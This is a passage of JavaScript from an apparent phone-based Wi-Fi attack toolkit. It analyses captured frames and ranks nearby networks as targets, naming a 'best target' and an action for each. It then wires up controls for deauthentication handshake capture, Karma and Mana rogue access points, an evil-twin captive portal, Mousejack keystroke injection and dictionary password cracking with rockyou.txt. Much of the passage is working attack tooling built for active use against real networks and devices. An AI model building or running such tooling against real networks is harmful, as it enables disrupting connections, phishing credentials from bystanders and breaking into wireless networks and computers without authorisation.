// ── analyze panel ─────────────────────────────────────────────────────────────
// Reading the capture. This is pure phone-side parsing of frames already synced
// down, so there is no device round-trip and no way for it to disturb the radio.
let analyzeResult = null;
let analysisPlan = null;
let selectedTargetIndex = null;  // which target the operator picked in Analysis

function renderAnalyzePanel(box) {
  const w = capture.writer;
  const liveN = w ? w.chunks.length : 0;
  // An imported capture is frames too. Counting only the live writer made this panel
  // claim "nothing captured yet" directly above findings read from a file the operator
  // had just imported — two claims that contradict each other on screen.
  const n = liveN || (importedCapture ? importedCapture.chunks.length : 0);
  const ready = n > 0;

  // Every interpolated value below is a static string, a number, or has been
  // through escapeHtml — nothing from the air reaches the DOM raw.
  box.innerHTML = `
    <div class="stagehead">
      ${Icon('analyze', { size: 22 })}
      <div>
        <div class="stagename">Observations</div>
        <div class="stagesub">Read the captured frames and work out what is on the air — access
          points, their security, and what devices are asking for.</div>
      </div>
    </div>

    <div class="row">
      <button id="anRun" class="primary" ${ready ? '' : 'disabled'}>
        ${Icon('analyze', { size: 18 })}Analyze ${ready ? n + ' frames' : 'frames'}
      </button>
    </div>

    ${ready ? '' : `<div class="empty">${Icon('capture', { size: 30 })}
      Nothing captured yet.<br>Run a capture and sync it down first.</div>`}

    <div id="anOut">${analyzeResult ? analyzeReportHtml(analyzeResult) : ''}</div>
  `;

  $('#anRun')?.addEventListener('click', onAnalyzeRun);
}

function onAnalyzeRun() {
  const w = capture.writer;
  // Analyze whichever frames exist — the live capture, or an imported one. Without the
  // fallback, making this panel's empty state import-aware would have turned the button
  // into a control that looks live and returns in silence.
  const chunks = (w && w.chunks.length) ? w.chunks
               : (importedCapture && importedCapture.chunks.length) ? importedCapture.chunks
               : null;
  if (!chunks) return;
  const t0 = Date.now();
  try {
    analyzeResult = analyzeChunks(chunks);
    const ms = Date.now() - t0;
    log('ev', `analyzed ${analyzeResult.frames} frames in ${ms} ms — ` +
      `${analyzeResult.aps.length} APs, ${analyzeResult.clients.length} clients, ` +
      `${analyzeResult.probes.length} leaked SSIDs`);
    if (analyzeResult.unparsed) log('err', `${analyzeResult.unparsed} frames did not parse`);
  } catch (e) {
    log('err', 'analyze: ' + e.message);
    return;
  }
  refreshPanels();
}

function analyzeReportHtml(r) {
  const fs = findings(r);

  const findingHtml = fs.map((f) => `
    <div class="finding ${escapeHtml(f.level)}">
      <div class="ftitle">${escapeHtml(f.title)}</div>
      <div class="fdetail">${escapeHtml(f.detail)}</div>
    </div>`).join('');

  const apHtml = r.aps.map((a) => {
    const kind = a.security?.kind || 'unknown';
    const openish = /Open|WEP/.test(kind);
    const name = a.ssid || (a.hidden ? '(hidden network)' : '(no name)');
    return `
      <div class="ap">
        <div class="apicon ${openish ? 'bad' : 'good'}">${Icon(openish ? 'unlock' : 'lock', { size: 17 })}</div>
        <div class="apmain">
          <div class="apssid">${escapeHtml(name)}</div>
          <div class="apmeta">${escapeHtml(a.bssid)} · ch${a.channel ?? '?'} · ${a.bestRssi ?? '?'} dBm
            · ${escapeHtml(kind)}${a.clientCount ? ` · ${a.clientCount} client${a.clientCount > 1 ? 's' : ''}` : ''}</div>
        </div>
        <div class="apcount">${a.beacons}<span>beacons</span></div>
      </div>`;
  }).join('');

  const pnlHtml = r.probes.map((p) => `
    <div class="pnlitem">
      <div class="pnlssid">${escapeHtml(p.ssid)}</div>
      <div class="pnlmeta">${p.count} request${p.count > 1 ? 's' : ''}
        · ${p.clients} device${p.clients > 1 ? 's' : ''} · ${p.bestRssi ?? '?'} dBm</div>
    </div>`).join('');

  const clientHtml = r.clients.map((c) => `
    <div class="client">
      <div class="cmac">${escapeHtml(c.mac)}${c.randomized ? ' <span class="tag">randomised</span>' : ''}</div>
      <div class="cmeta">${c.frames} frames${c.bssid ? ' · on ' + escapeHtml(c.bssid) : ''}
        ${c.probed.length ? ' · asked for ' + c.probed.map(escapeHtml).join(', ') : ''}</div>
    </div>`).join('');

  const secRows = Object.entries(r.security)
    .sort((a, b) => b[1] - a[1])
    .map(([k, v]) => `<dt>${escapeHtml(k)}</dt><dd>${v}</dd>`).join('');

  const chanRows = r.channels
    .map((c) => `<dt>ch ${c.channel}</dt><dd>${c.frames}</dd>`).join('');

  return `
    ${findingHtml ? `<div class="findings">${findingHtml}</div>` : ''}

    <div class="secsum">
      <div class="sechead">${Icon('analyze', { size: 16 })} Frame summary</div>
      <dl class="kv">
        <dt>frames parsed</dt><dd>${r.parsed} of ${r.frames}${r.unparsed || r.noRadiotap ? ` (${r.unparsed + r.noRadiotap} skipped)` : ''}</dd>
        <dt>access points</dt><dd>${r.aps.length}</dd>
        <dt>clients</dt><dd>${r.clients.length}</dd>
        <dt>leaked names</dt><dd>${r.probes.length}</dd>
      </dl>
      ${secRows ? `<div class="sechead" style="margin-top:12px">${Icon('lock', { size: 16 })} Security</div><dl class="kv">${secRows}</dl>` : ''}
      ${chanRows ? `<div class="sechead" style="margin-top:12px">${Icon('list', { size: 16 })} Frames per channel</div><dl class="kv">${chanRows}</dl>` : ''}
    </div>

    <div class="sechead">${Icon('antenna', { size: 16 })} Access points (${r.aps.length})</div>
    <div class="aplist">${apHtml || '<div class="empty">none</div>'}</div>

    ${r.probes.length ? `
      <div class="sechead">${Icon('device', { size: 16 })} Remembered networks (${r.probes.length})</div>
      <div class="pnlnote">Networks a device has connected to before, asked for by name in the
        clear. This is the Preferred Network List — each one is a name a device will try to
        associate with if something claims it.</div>
      <div class="pnllist">${pnlHtml}</div>` : ''}

    ${r.clients.length ? `
      <div class="sechead">${Icon('device', { size: 16 })} Clients (${r.clients.length})</div>
      <div class="clientlist">${clientHtml}</div>` : ''}
  `;
}

// ── stage 3: analysis ─────────────────────────────────────────────────────────
// Analysis reads Analyze's result and produces a plan: which networks are worth
// acting on, in what order, and why. Entirely phone-side — like Analyze, it
// never touches the radio, so the ranking can change without a reflash.
//
// The plan is also what a one-tap flow consumes: each target carries the single
// action that follows from its verdict (deauth-capture, associate, listen).

function renderAnalysisPanel(box) {
  const ready = !!analyzeResult;

  box.innerHTML = `
    <div class="stagehead">
      ${Icon('analysis', { size: 22 })}
      <div>
        <div class="stagename">Assessment</div>
        <div class="stagesub">Turn the inventory into a plan — what is worth doing, in what
          order, and why. Nothing here touches the radio.</div>
      </div>
    </div>

    <div class="row">
      <button id="plRun" class="primary" ${ready ? '' : 'disabled'}>
        ${Icon('analysis', { size: 18 })}Build plan
      </button>
      <button id="plSave" class="ghost" ${analysisPlan ? '' : 'disabled'}>
        ${Icon('save', { size: 18 })}Save report
      </button>
    </div>

    ${ready ? '' : `<div class="empty">${Icon('analyze', { size: 30 })}
      Nothing analysed yet.<br>Run Analyze first — Analysis reads its result.</div>`}

    <div id="plOut">${analysisPlan ? analysisPlanHtml(analysisPlan) : ''}</div>
  `;

  $('#plRun')?.addEventListener('click', onAnalysisRun);
  $('#plSave')?.addEventListener('click', onAnalysisSave);
}

function onAnalysisRun() {
  if (!analyzeResult) return;
  try {
    analysisPlan = plan(analyzeResult);
  } catch (e) {
    log('err', 'analysis: ' + e.message);
    return;
  }
  const s = analysisPlan.summary;
  log('ev', `plan: ${s.attackable} attackable of ${s.networks} networks, ` +
    `${s.skipped} skipped, ${s.rogueNames} un-answered leaked name${s.rogueNames === 1 ? '' : 's'}`);
  const top = topTarget(analysisPlan);
  if (top) log('ev', `best target: ${top.name} — ${top.action.label}`);
  refreshPanels();
}

/**
 * Write the plan out as text.
 *
 * Unlike the pcap this is a string, so `encoding: 'utf8'` is load-bearing:
 * Capacitor's Filesystem assumes base64 for a string `data` unless told
 * otherwise, and a base64-decode of plain text silently produces garbage.
 */
async function onAnalysisSave() {
  if (!analysisPlan) return;
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  const name = `analysis-${d.getFullYear()}${p(d.getMonth() + 1)}${p(d.getDate())}`
    + `-${p(d.getHours())}${p(d.getMinutes())}${p(d.getSeconds())}.txt`;
  try {
    const fs = window.Capacitor?.Plugins?.Filesystem;
    if (!fs) throw new Error('Filesystem plugin not available');
    const res = await fs.writeFile({
      path: `RadioConsole/${name}`,
      data: reportText(analysisPlan),
      directory: 'DOCUMENTS',
      encoding: 'utf8',
      recursive: true,
    });
    log('ev', `saved report ${res?.uri || name}`);
  } catch (e) {
    log('err', 'save report: ' + e.message);
  }
}

/** The target's action pill.
 *
 *  For 'deauth-capture' this is a real control, not a label: the pill is the most
 *  prominent affordance on the card and it names the action, so tapping it has to
 *  do the action. It routes to the same place the Pick button does — Attacks with
 *  the Force-a-handshake card open — because that is where the burst is fired.
 *  A pill that reads as tappable and is not is worse than no pill at all, which is
 *  exactly how it was read on the phone.
 *
 *  The other action types stay labels: 'listen' and 'associate' have no card on the
 *  Attacks page to send you to, so a button there would be a second dead control.
 */
function tactionHtml(t, idx) {
  const type = escapeHtml(t.action.type);
  const label = `${Icon('attack', { size: 15 })}${escapeHtml(t.action.label)}`;
  return t.action.type === 'deauth-capture'
    ? `<button class="taction ${type}" data-idx="${idx}">${label}</button>`
    : `<div class="taction ${type}">${label}</div>`;
}

function analysisPlanHtml(p) {
  // As in renderAnalyzePanel: every value that came off the air — SSIDs, BSSIDs,
  // the leaked names, the reason text — goes through escapeHtml before it
  // reaches this template. Everything else is static markup or a number, so
  // nothing untrusted is interpolated raw.
  const s = p.summary;

  const targetHtml = p.targets.map((t, idx) => {
    const reasons = t.reasons.map((r) => `
      <li class="${r.points ? '' : 'zero'}">
        <span class="rp ${r.points > 0 ? 'up' : r.points < 0 ? 'down' : ''}">${r.points > 0 ? '+' : ''}${r.points}</span>
        <span class="rt">${escapeHtml(r.text)}</span>
      </li>`).join('');

    return `
      <div class="target ${escapeHtml(t.level)}${selectedTargetIndex === idx ? ' picked' : ''}" data-idx="${idx}">
        <button class="pick-target" data-idx="${idx}">${selectedTargetIndex === idx ? Icon('check', { size: 16 }) + 'Picked' : 'Pick'}</button>
        <div class="thead">
          <div class="trank">${t.rank ? '#' + t.rank : '—'}</div>
          <div class="tmain">
            <div class="tname">${escapeHtml(t.name)}</div>
            <div class="tmeta">${escapeHtml(t.bssid)} · ch${t.channel ?? '?'} · ${t.rssi ?? '?'} dBm · ${escapeHtml(t.security)}</div>
          </div>
          <div class="tscore">${t.score}<span>score</span></div>
        </div>
        <div class="tverdict">${escapeHtml(t.verdict)}</div>
        <ul class="reasons">${reasons}</ul>
        ${tactionHtml(t, idx)}
      </div>`;
  }).join('');

  const rogueHtml = p.rogue.map((g) => `
    <div class="rogueitem ${g.onAir ? 'onair' : 'void'}">
      <div class="rssid">${escapeHtml(g.ssid)}</div>
      <div class="rmeta">${g.count} request${g.count > 1 ? 's' : ''} · ${g.clients} device${g.clients > 1 ? 's' : ''} · ${g.bestRssi ?? '?'} dBm · ${g.onAir ? 'on air' : 'not on air'}</div>
      <div class="rnote">${escapeHtml(g.note)}</div>
    </div>`).join('');

  const top = topTarget(p);

  return `
    <div class="secsum">
      <div class="sechead">${Icon('analysis', { size: 16 })} Plan</div>
      <dl class="kv">
        <dt>networks</dt><dd>${s.networks}</dd>
        <dt>attackable</dt><dd>${s.attackable}</dd>
        <dt>skipped</dt><dd>${s.skipped}</dd>
        <dt>un-answered names</dt><dd>${s.rogueNames}</dd>
      </dl>
      ${top ? `<div class="topnote">${Icon('attack', { size: 16 })}
        <span>Best target: <strong>${escapeHtml(top.name)}</strong> — ${escapeHtml(top.action.label)}</span></div>` : ''}
    </div>

    <div class="sechead">${Icon('list', { size: 16 })} Targets (${p.targets.length})</div>
    <div class="targetlist">${targetHtml || '<div class="empty">none</div>'}</div>

    ${p.rogue.length ? `
      <div class="sechead">${Icon('device', { size: 16 })} Rogue-AP candidates (${p.rogue.length})</div>
      <div class="pnlnote">A name a device keeps asking for that no AP is answering is the
        strongest play here — a rogue AP claiming it would be the only AP claiming it.</div>
      <div class="roguelist">${rogueHtml}</div>` : ''}
  `;
}

// ── attack panel ──────────────────────────────────────────────────────────────
// Stage 4. Everything above this line listens; this is the first stage that
// could change the air, so the panel is built around saying plainly what is and
// is not possible right now rather than around a row of buttons that mostly do
// nothing.
//
// Two of the four attacks are wired to real work today: password cracking runs
// end to end (extract here, search on the bridge). The other three need the
// radio to transmit, which our firmware cannot do — that is a firmware
// question, and the panel says so instead of pretending otherwise.

// Our firmware has a transmit path as of 0.3.0-tx: the TX_FRAME command takes a
// frame the app built and puts it on the air. This is the single honest answer
// to "can the radio inject?" — and it is not taken on faith. It was verified by
// injecting a beacon carrying this board's own MAC and reading it back with an
// independent receiver, then confirming the channel by doing it again on a
// different one. Flip this back to false only if the flashed firmware has no
// TX_FRAME — the panel will then block the three transmit attacks again, which
// is the correct behaviour rather than a regression.
const FIRMWARE_CAN_TRANSMIT = true;

// The bridge URL and token are NOT in this file. They are yours — your network
// and a live credential for your GPU box — so the tracked default is empty and
// the real values live in the gitignored `bridge-defaults.js` (copy
// `bridge-defaults.example.js`). A fresh clone therefore starts unconfigured
// and asks, instead of shipping somebody's host and token.
const BRIDGE_DEFAULTS = window.BRIDGE_DEFAULTS || {};
const BRIDGE_DEFAULT_URL = BRIDGE_DEFAULTS.url || '';
const BRIDGE_DEFAULT_TOKEN = BRIDGE_DEFAULTS.token || '';

let handshakeResult = null;   // crack extraction over the current capture
// A capture that came in as a file rather than off the wire. Kept apart from
// `capture` (the live session, which has start/stop/sync and a real board behind
// it) so an import can never look like a device that is connected.
let importedCapture = null;   // { name, kind, chunks, meta, warnings }
let bridgeStatus = null;      // last /health reading, null until tested
let bridgeError = null;
let crackJob = null;          // live progress: {state, progress, speed_hs, ...}
let crackRunning = false;
let txResult = null;          // last burst: {phase, requested, sent, failed, ...}
let txRunning = false;
let kaputResult = null;       // last kaput guard check: {alive, beacons, chunks}
let karmaRunning = false;
let karmaResult = null;
let manaRunning = false;
let manaResult = null;
let analyzerRunning = false;
let analyzerResult = null;

const CRACK_DEFAULT_STRATEGY = {
  mode: 'dictionary',
  wordlist: 'rockyou.txt',
  rules: 'best64.rule',
  mask: '?d?d?d?d?d?d?d?d',
  chain: false,
};

/** Saved crack strategy from localStorage (or defaults). */
function crackStrategy() {
  try { return { ...CRACK_DEFAULT_STRATEGY, ...JSON.parse(localStorage.getItem('crackStrategy')) }; }
  catch { return { ...CRACK_DEFAULT_STRATEGY }; }
}
function saveCrackStrategy(s) {
  localStorage.setItem('crackStrategy', JSON.stringify(s));
}
const BRIDGE_HISTORY_KEY = 'bridgeUrlHistory';
const BRIDGE_HISTORY_MAX = 15;
const PRESETS_KEY = 'attackPresets';

/** Common default/router SSIDs for quick-fill in Karma & Mana. */
const COMMON_DEFAULT_SSIDS = [
  'NETGEAR', 'Linksys', 'xfinitywifi', 'attwifi',
  'T-Mobile', 'SpectrumWiFi', 'Verizon', 'COX', 'OptimumWiFi',
  'CenturyLink', 'Starbucks WiFi',
];

/** Generate a random unicast, locally-administered MAC. Clears the
 *  multicast bit (byte 0 bit 0) and sets the locally-administered bit
 *  (byte 0 bit 1), so the address is valid for over-the-air use. */
function randomMac() {
  const b = new Uint8Array(6);
  crypto.getRandomValues(b);
  b[0] = (b[0] & 0xfe) | 0x02;   // unicast (clear bit 0), local (set bit 1)
  return Array.from(b).map((x) => x.toString(16).padStart(2, '0')).join(':');
}

function loadPresets() {
  try { return JSON.parse(localStorage.getItem(PRESETS_KEY) || '{}'); }
  catch { return {}; }
}
function savePreset(name, config) {
  const all = loadPresets();
  all[name] = config;
  localStorage.setItem(PRESETS_KEY, JSON.stringify(all));
}
function deletePreset(name) {
  const all = loadPresets();
  delete all[name];
  localStorage.setItem(PRESETS_KEY, JSON.stringify(all));
}
/** Generate the preset dropdown + save/delete buttons for one attack type. */
function presetControlsHtml(type, saved) {
  const all = loadPresets();
  const myPresets = Object.entries(all).filter(([, v]) => v.type === type);
  if (!myPresets.length && !saved) return '';
  return `<div class="row" style="margin-top:4px;gap:4px">
    ${myPresets.length ? `<select id="${type}PresetLoad" style="flex:1;font-size:12px">
      <option value="">Load preset…</option>
      ${myPresets.map(([k]) => `<option value="${escapeHtml(k)}">${escapeHtml(k)}</option>`).join('')}
    </select>` : ''}
    ${saved ? `<span id="${type}PresetName" style="font-size:11px;opacity:.6;flex:1">${escapeHtml(saved)}</span>` : ''}
    <button id="${type}PresetSave" class="ghost" style="font-size:11px">${Icon('save', { size: 12 })}Save</button>
    ${myPresets.length ? `<button id="${type}PresetDel" class="ghost" style="font-size:11px" ${saved ? '' : 'disabled'}>${Icon('close', { size: 12 })}Del</button>` : ''}
  </div>`;
}

function fillDefaults(textareaId) {
  const el = document.getElementById(textareaId);
  if (!el) return;
  el.value = COMMON_DEFAULT_SSIDS.join('\n');
}

function bridgeUrlHistory() {
  try {
    return JSON.parse(localStorage.getItem(BRIDGE_HISTORY_KEY) || '[]');
  } catch { return []; }
}

function saveBridgeUrl(url) {
  const trimmed = url.trim();
  if (!trimmed) return;
  const list = bridgeUrlHistory().filter((u) => u !== trimmed);
  list.unshift(trimmed);
  localStorage.setItem(BRIDGE_HISTORY_KEY, JSON.stringify(list.slice(0, BRIDGE_HISTORY_MAX)));
}

function bridgeConfig() {
  return {
    url: localStorage.getItem('bridgeUrl') || BRIDGE_DEFAULT_URL,
    token: localStorage.getItem('bridgeToken') || BRIDGE_DEFAULT_TOKEN,
  };
}

function bridgeClient() {
  const c = bridgeConfig();
  return new CrackBridge({ baseUrl: c.url, token: c.token });
}

/** Everything the attack list needs to judge readiness. */
function attackContext() {
  const captured = !!capture?.writer?.chunks?.length;
  // If an analysis plan exists, the captured data is real — the plan was built
  // from it. Fall back to the plan as proof capture ran, in case the writer
  // reference was cleared by a re-render or navigation.
  // An import counts as capture proof too: the file *is* the capture, and every
  // stage downstream (extract, crack) works on it exactly as it does on a live one.
  const hasCaptureProof = captured || (analysisPlan && analysisPlan.targets.length > 0) || !!importedCapture;
  return {
    hasCapture: hasCaptureProof,
    hasHandshake: !!handshakeResult?.handshakes?.length,
    canTransmit: FIRMWARE_CAN_TRANSMIT,
    bridgeReachable: !!bridgeStatus?.ok,
  };
}

function renderAttackPanel(box, opts = {}) {
  const ctx = attackContext();
  // One renderer, two pages: Attacks shows every attack but cracking, Crack shows
  // only cracking. Sharing the drawing code is the point — an attack looks the
  // same wherever it is shown.
  let list = attackList(ctx);
  if (opts.only)    list = list.filter((a) => a.id === opts.only);
  if (opts.exclude) list = list.filter((a) => a.id !== opts.exclude);
  const heldBack = blockedOnTransmit(ctx).filter((a) => list.some((b) => b.id === a.id));
  // The bridge summary belongs to the panel that can actually crack. Both pages draw
  // this panel, and the summary carried #brOpenSettings — one id, two copies, so the
  // wiring's box lookup and any document lookup disagreed about which button they
  // meant. Emit it only where the cracking card is, and the id exists once again.
  const showsCrack = list.some((a) => a.id === 'crack');
  const head = opts.head || {
    icon: 'attack',
    name: 'Attack',
    sub: 'Automated attacks against what the capture found. Every entry says what it needs; ' +
         'nothing here reports having run when it did not.',
  };

  // Every air-derived value below — SSIDs, BSSIDs, the passphrase, error text
  // from the bridge — goes through escapeHtml. Everything else is static markup
  // or a number.
  const listHtml = list.map((a) => {
    // Three states, not two. A ready attack whose firmware half is only half there
    // used to show "ready" next to a "partial" label — the same claim in a smaller
    // font. The badge tells the truth first; readiness comes second.
    const state = a.built === 'partial' ? 'partial' : (a.ready ? 'ready' : 'blocked');
    // "not ready" reads as a state; "blocked" reads as someone stopping you.
    const badge = state === 'blocked' ? 'not ready' : state;
    const blockers = a.blockers.map((b) => `
      <li><span class="bneed">${escapeHtml(b.need)}</span>${escapeHtml(b.text)}</li>`).join('');
    // One row per attack, opened by tapping it. Six cards open at once was a wall of
    // prose you had to scroll through to reach the one you wanted — the name and the
    // state badge belong on screen, the paragraphs do not. The body is a native
    // <details>, so showing and hiding it costs no JavaScript.
    return `
    <details class="atk ${state}" data-atk="${escapeHtml(a.id)}"${openAttackId === a.id ? ' open' : ''}>
      <summary class="atkhead">
        <span class="atkicon">${Icon(a.icon, { size: 18 })}</span>
        <div class="atkmain">
          <div class="atkname">${escapeHtml(a.name)}</div>
          <div class="atkmeta">${escapeHtml(a.kind)}</div>
        </div>
        <div class="atkstate ${state}">${badge}</div>
        <span class="atkchev">${Icon('chevron', { size: 16 })}</span>
      </summary>
      <div class="atkbody">
      <div class="atktag">${escapeHtml(a.tagline)}</div>
      ${a.firmwareNote ? `<div class="atkfw">${
        a.firmware ? `<code>${escapeHtml(a.firmware)}</code> ` : ''
      }${escapeHtml(a.firmwareNote)}</div>` : ''}
      ${blockers ? `<ul class="blockers">${blockers}</ul>` : ''}
      ${a.id === 'crack' ? crackActionHtml(a) : ''}
      ${a.id === 'handshake' ? deauthActionHtml(a) : ''}
      ${a.id === 'karma' ? karmaActionHtml(a) : ''}
      ${a.id === 'mana' ? manaActionHtml(a) : ''}
      ${a.id === 'portal' ? portalActionHtml(a) : ''}
      ${a.id === 'mousejack' ? mousejackActionHtml(a) : ''}
      </div>
    </details>`;
  }).join('');

  box.innerHTML = `
    <div class="stagehead">
      ${Icon(head.icon, { size: 22 })}
      <div>
        <div class="stagename">${escapeHtml(head.name)}</div>
        <div class="stagesub">${escapeHtml(head.sub)}</div>
      </div>
    </div>

    ${showsCrack ? `
    <div class="secsum">
      <div class="sechead">${Icon('link', { size: 16 })} Crack bridge</div>
      ${bridgeStateHtml()}
      <div class="row" style="margin-top:6px">
        <button id="brOpenSettings" class="ghost" style="font-size:12px">
          ${Icon('gear', { size: 14 })}Bridge settings</button>
      </div>
    </div>
` : ''}

    <div class="sechead">${Icon('list', { size: 16 })} Attacks (${list.length})</div>
    <div class="atklist">${listHtml}</div>

    ${heldBack.length ? `<div class="pnlnote">${heldBack.length} of these need the radio to
      transmit. That is one piece of work — a TX path in the firmware — not
      ${heldBack.length} separate problems.</div>` : ''}
  `;

  // The rows show and hide themselves (native <details>); this only remembers which
  // one, so the next repaint puts the screen back the way the operator left it.
  box.querySelectorAll('details.atk').forEach((d) => {
    d.addEventListener('toggle', () => {
      if (d.open) {
        openAttackId = d.dataset.atk;
        box.querySelectorAll('details.atk').forEach((o) => { if (o !== d) o.open = false; });
      } else if (openAttackId === d.dataset.atk) {
        openAttackId = null;
      }
    });
  });

  // Every lookup below is scoped to `box`. The same card is drawn on more than one
  // page — the Crack tab and the Attacks tab both build it — so binding through the
  // document resolves to whichever copy comes first in the document order and
  // leaves the copy the operator is actually looking at dead: a button that looks
  // live, taps, and does nothing. querying the box can only ever reach this panel's
  // own node, so a second copy on another page cannot steal the wiring.
  const $b = (sel) => box.querySelector(sel);
  // The bridge's own controls moved to Settings (see wireBridgeConfig); all that
  // stays here is the way over there.
  $b('#brOpenSettings')?.addEventListener('click', () => setPage('settings'));
  $b('#crackExtract')?.addEventListener('click', onExtractHandshakes);
  $b('#crackRun')?.addEventListener('click', onCrackRun);

  // Crack strategy controls — save to localStorage on change
  $b('#crackWl')?.addEventListener('change', (e) => {
    const s = crackStrategy();
    s.wordlist = e.target.value;
    saveCrackStrategy(s);
  });
  $b('#crackRl')?.addEventListener('change', (e) => {
    const s = crackStrategy();
    s.rules = e.target.value;
    saveCrackStrategy(s);
  });
  $b('#crackMode')?.addEventListener('change', (e) => {
    const s = crackStrategy();
    s.mode = e.target.value;
    saveCrackStrategy(s);
    refreshPanels(); // toggle mask field visibility
  });
  $b('#crackMask')?.addEventListener('change', (e) => {
    const s = crackStrategy();
    s.mask = e.target.value.trim() || CRACK_DEFAULT_STRATEGY.mask;
    saveCrackStrategy(s);
  });
  $b('#crackChain')?.addEventListener('change', (e) => {
    const s = crackStrategy();
    s.chain = e.target.checked;
    saveCrackStrategy(s);
  });
  $b('#deauthGo')?.addEventListener('click', onDeauthCapture);
  $b('#deauthStop')?.addEventListener('click', onDeauthStop);
  $b('#karmaGo')?.addEventListener('click', onKarmaStart);
  $b('#karmaStop')?.addEventListener('click', onKarmaStop);
  $b('#karmaRefresh')?.addEventListener('click', pollKarmaStatus);
  $b('#karmaDefaults')?.addEventListener('click', () => fillDefaults('karmaList'));
  $b('#karmaBssidRandom')?.addEventListener('click', () => {
    const el = $b('#karmaBssid');
    if (el) { el.value = randomMac(); localStorage.setItem('attackBssid', el.value); }
  });
  $b('#karmaBssid')?.addEventListener('change', (e) => {
    localStorage.setItem('attackBssid', e.target.value.trim());
  });
  $b('#manaGo')?.addEventListener('click', onManaStart);
  $b('#manaStop')?.addEventListener('click', onManaStop);
  $b('#manaRefresh')?.addEventListener('click', pollManaStatus);
  // Portal — the twin. Scan seeds it, a human picks, the token arms it.
  $b('#portalScan')?.addEventListener('click', onPortalScan);
  $b('#portalPick')?.addEventListener('change', onPortalPickCandidate);
  $b('#portalGo')?.addEventListener('click', onPortalStart);
  $b('#portalStop')?.addEventListener('click', onPortalStop);
  $b('#portalRefresh')?.addEventListener('click', pollPortalStatus);
  $b('#portalPush')?.addEventListener('click', onPortalPushPage);
  $b('#portalPageDefault')?.addEventListener('click', () => {
    const el = $b('#portalPage');
    if (el) {
      const fresh = portalPageHtml(portalTwin?.ssid, portalTemplateId());
      el.value = fresh;
      localStorage.removeItem('portalPage');
    }
  });
  $b('#portalTmpl')?.addEventListener('change', (e) => {
    const id = e.target.value;
    localStorage.setItem('portalTemplate', id);
    const el = $b('#portalPage');
    if (el) {
      const fresh = portalPageHtml(portalTwin?.ssid, id);
      el.value = fresh;
      localStorage.removeItem('portalPage');
    }
  });
  $b('#portalSubsClear')?.addEventListener('click', () => { portalSubs = []; refreshPanels(); });
  $b('#manaDefaults')?.addEventListener('click', () => fillDefaults('manaList'));
  $b('#manaBssidRandom')?.addEventListener('click', () => {
    const el = $b('#manaBssid');
    if (el) { el.value = randomMac(); localStorage.setItem('attackBssid', el.value); }
  });
  $b('#manaBssid')?.addEventListener('change', (e) => {
    localStorage.setItem('attackBssid', e.target.value.trim());
  });
  $b('#manaPopulate')?.addEventListener('click', onManaPopulate);

  // ── mousejack event handlers ─────────────────────────────────────────────
  $b('#mjGo')?.addEventListener('click', onMousejackSend);
  $b('#mjClear')?.addEventListener('click', () => {
    state.mjResult = null; state.mjSending = false;
    refreshPanels();
  });
  $b('#mjPayload')?.addEventListener('change', (e) => {
    const p = MOUSEJACK_PAYLOADS.find(p => p.id === e.target.value);
    if (p && p.hex) {
      $b('#mjHex').value = p.hex;
      $b('#mjInfo').textContent = escapeHtml(p.description);
    } else if (p) {
      $b('#mjInfo').textContent = escapeHtml(p.description || 'Type hex directly below.');
    }
  });
  $b('#mjAddr')?.addEventListener('change', (e) => {
    localStorage.setItem('mousejackAddr', e.target.value.trim());
  });
  $b('#mjCh')?.addEventListener('change', (e) => {
    localStorage.setItem('mousejackCh', e.target.value);
  });
  $b('#mjCount')?.addEventListener('change', (e) => {
    localStorage.setItem('mousejackCount', e.target.value);
  });

  // ── preset event handlers ──────────────────────────────────────────────

  function captureToPreset(type) {
    const prefix = type;
    const ch = $b(`#${prefix}Ch`);
    const list = $b(`#${prefix}List`);
    const bssid = $b(`#${prefix}Bssid`);
    const common = {
      bssid: bssid?.value?.trim() || '',
      channel: parseInt(ch?.value || '6', 10),
      ssids: (list?.value || '').split('\n').map(s => s.trim()).filter(Boolean),
    };
    if (type === 'karma') {
      const mode = $b(`#${type}ModeSel`);
      return { ...common, type: 'karma', mode: mode?.value || 'allowlist' };
    }
    const intv = $b(`#${type}Intv`);
    return { ...common, type: 'mana', interval: parseInt(intv?.value || '110', 10) };
  }
  function fillFromPreset(type, p) {
    const prefix = type;
    const ch = $b(`#${prefix}Ch`);
    const list = $b(`#${prefix}List`);
    const bssid = $b(`#${prefix}Bssid`);
    if (ch) ch.value = String(p.channel || 6);
    if (list) list.value = (p.ssids || []).join('\n');
    if (bssid) { bssid.value = p.bssid || ''; localStorage.setItem('attackBssid', p.bssid || ''); }
    if (type === 'karma') {
      const mode = $b(`#${type}ModeSel`);
      if (mode) mode.value = p.mode || 'allowlist';
    } else {
      const intv = $b(`#${type}Intv`);
      if (intv) intv.value = String(p.interval || 110);
    }
    localStorage.setItem(`${type}Preset`, '');
  }

  function promptSave(type) {
    const name = prompt('Save as preset:');
    if (!name) return;
    const config = captureToPreset(type);
    savePreset(name, config);
    localStorage.setItem(`${type}Preset`, name);
    refreshPanels();
  }

  $b('#karmaPresetSave')?.addEventListener('click', () => promptSave('karma'));
  $b('#karmaPresetLoad')?.addEventListener('change', (e) => {
    const name = e.target.value;
    if (!name) return;
    const all = loadPresets();
    const p = all[name];
    if (!p) return;
    fillFromPreset('karma', p);
    localStorage.setItem('karmaPreset', name);
    refreshPanels();
  });
  $b('#karmaPresetDel')?.addEventListener('click', () => {
    const name = localStorage.getItem('karmaPreset');
    if (!name) return;
    if (!confirm(`Delete preset "${name}"?`)) return;
    deletePreset(name);
    localStorage.removeItem('karmaPreset');
    refreshPanels();
  });

  $b('#manaPresetSave')?.addEventListener('click', () => promptSave('mana'));
  $b('#manaPresetLoad')?.addEventListener('change', (e) => {
    const name = e.target.value;
    if (!name) return;
    const all = loadPresets();
    const p = all[name];
    if (!p) return;
    fillFromPreset('mana', p);
    localStorage.setItem('manaPreset', name);
    refreshPanels();
  });
  $b('#manaPresetDel')?.addEventListener('click', () => {
    const name = localStorage.getItem('manaPreset');
    if (!name) return;
    if (!confirm(`Delete preset "${name}"?`)) return;
    deletePreset(name);
    localStorage.removeItem('manaPreset');
    refreshPanels();
  });

}

function bridgeStateHtml() {
  if (bridgeError) {
    return `<div class="finding high"><div class="ftitle">${Icon('alert', { size: 15 })}Bridge unreachable</div>
      <div class="fdetail">${escapeHtml(bridgeError)}</div></div>`;
  }
  if (!bridgeStatus?.ok) {
    return `<div class="pnlnote">Not tested yet.</div>`;
  }
  const wl = (bridgeStatus.wordlists || []).join(', ') || 'none';
  const rl = (bridgeStatus.rules || []).join(', ') || 'none';
